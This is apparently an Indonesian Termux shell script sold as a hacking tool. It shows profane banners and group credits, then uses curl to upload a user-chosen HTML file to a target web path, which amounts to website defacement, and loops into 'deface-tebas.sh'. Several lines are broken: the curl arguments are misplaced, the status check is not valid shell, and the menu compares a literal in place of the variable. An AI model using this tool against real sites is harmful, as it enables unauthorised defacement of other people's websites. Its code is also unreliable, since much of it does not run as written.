biru='\033[34;1m'
hijau='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
merah='\033[31;1m'
putih='\033[37;1m'
kuning='\033[33;1m'
echo $kuning "maaf bro install alat bentar" 
sleep 3
pkg install lolcat
pkg install cowsay
pkg install toilet
pkg install figlet
clear
sleep 2
clear
echo "welcome in you tool" 
reset
echo
echo
echo $biru   "|=========================================================|"
echo $putih  "|~~~~~~~~~~~~~~~~~~~FUCK YOUR SYSTEM~~~~~~~~~~~~~~~~~~~~~~|"
echo $kuning "|~~~~~~~~~~~~~~~~~~~~~~~4N0T1K^S~~~~~~~~~~~~~~~~~~~~~~~~~~|"
echo $putih  "|~~~~~~~~~~~~~~~~~~~~~~~~÷R.O.G÷~~~~~~~~~~~~~~~~~~~~~~~~~~|"
echo $biru   "|=========================================================|"
echo
echo
sleep 3
echo
echo "siapa nama anda :"
 read -p "$" nama
cowsay -f eyes WELCOME IN YOUT TOOL $nama
echo
echo $merah "<÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷>" 
echo $putih "# FROM R.O.G [REPUBLIK OF GRETONGER]     #" 
echo $putih "# AUTHOR BY : 4N0TYK^S, ALL MEMBER R.O.G #"
echo $biru  "# SUPPORTED BY : CYBER WANERS ARMY       #" 
echo $biru  "# Special thanks for all my friend's     #" 
echo $merah "<÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷÷>"
sleep 3
echo
echo
echo $hijau "SIAPKAN FILE DAN WEB ANDA DENGAN BENAR" 
sleep 3
echo "input your file/script extensi html :"
 read -p "$" script
echo "input path object/web :"
 read -p "$" web
curl -T /storage/emulated/0/ $script $web
if web.status < 200 or web.status >= 300 
echo "gagal masbro" 

echo $cyan "hasil $web/$script"
echo $hijau "masukan hasil di atas ini ke browser anda" 
echo

echo $cyan "exit?" ["B"/$biru"E"]
read o
if [ o = B ] || [ o = b ] 
then 
sh deface-tebas.sh
fi

if [ o = E ] || [ o = e ] 
then
exit
fi
